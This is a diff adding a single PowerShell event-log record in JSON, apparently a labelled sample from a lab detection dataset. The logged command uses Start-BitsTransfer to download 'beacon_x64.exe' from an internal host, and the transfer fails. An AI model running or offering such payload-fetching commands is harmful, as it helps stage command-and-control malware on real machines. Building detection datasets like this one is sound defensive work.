@@ -1,0 +1,86 @@
+{
+    "process": {
+        "args": [
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        ],
+        "args_count": 1,
+        "title": "ConsoleHost",
+        "command_line": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+    },
+    "winlog": {
+        "event_id": "800",
+        "task": "Pipeline Execution Details",
+        "keywords": [
+            "Classic"
+        ],
+        "channel": "Windows PowerShell",
+        "api": "wineventlog",
+        "provider_name": "PowerShell",
+        "opcode": "Info"
+    },
+    "log": {
+        "level": "information"
+    },
+    "message": "Pipeline execution details for command line: Start-BitsTransfer -Source \"http://10.78.50.5:8000/beacon_x64.exe\" -Destination \"C:\\tmp\\Low\". \n\nContext Information: \n\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=306\n\n\tUserId=MELD\\LAB Administrator\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.4648\n\tHostId=40d9dc21-4e9f-478f-b1c6-7ce8f783184c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=5.1.19041.4648\n\tRunspaceId=0d9b0adc-1e47-4f17-afde-eab93e4ab688\n\tPipelineId=111\n\tScriptName=\n\tCommandLine=Start-BitsTransfer -Source \"http://10.78.50.5:8000/beacon_x64.exe\" -Destination \"C:\\tmp\\Low\" \n\nDetails: \nCommandInvocation(Start-BitsTransfer): \"Start-BitsTransfer\"\nParameterBinding(Start-BitsTransfer): name=\"Source\"; value=\"http://10.78.50.5:8000/beacon_x64.exe\"\nParameterBinding(Start-BitsTransfer): name=\"Destination\"; value=\"C:\\tmp\\Low\"\nTerminatingError(Start-BitsTransfer): \"The directory name is invalid. (Exception from HRESULT: 0x8007010B)\"\n",
+    "related": {
+        "user": "LAB Administrator"
+    },
+    "powershell": {
+        "sequence": 1,
+        "process": {
+            "executable_version": "5.1.19041.4648"
+        },
+        "total": 1,
+        "engine": {
+            "version": "5.1.19041.4648"
+        },
+        "runspace_id": "0d9b0adc-1e47-4f17-afde-eab93e4ab688",
+        "pipeline_id": "111",
+        "command": {
+            "invocation_details": [
+                {
+                    "related_command": "Start-BitsTransfer",
+                    "type": "CommandInvocation",
+                    "value": "\"Start-BitsTransfer\""
+                },
+                {
+                    "related_command": "Start-BitsTransfer",
+                    "name": "\"Source\"",
+                    "type": "ParameterBinding",
+                    "value": "\"http://10.78.50.5:8000/beacon_x64.exe\""
+                },
+                {
+                    "related_command": "Start-BitsTransfer",
+                    "name": "\"Destination\"",
+                    "type": "ParameterBinding",
+                    "value": "\"C:\\tmp\\Low\""
+                },
+                {
+                    "related_command": "Start-BitsTransfer",
+                    "type": "TerminatingError",
+                    "value": "\"The directory name is invalid. (Exception from HRESULT: 0x8007010B)\""
+                }
+            ],
+            "value": "Start-BitsTransfer -Source \"http://10.78.50.5:8000/beacon_x64.exe\" -Destination \"C:\\tmp\\Low\""
+        }
+    },
+    "event": {
+        "sequence": 306,
+        "code": "800",
+        "provider": "PowerShell",
+        "kind": "event",
+        "module": "powershell",
+        "action": "Pipeline Execution Details",
+        "type": [
+            "info"
+        ],
+        "category": [
+            "process"
+        ]
+    },
+    "user": {
+        "domain": "MELD",
+        "name": "LAB Administrator"
+    },
+    "label": 1
+}
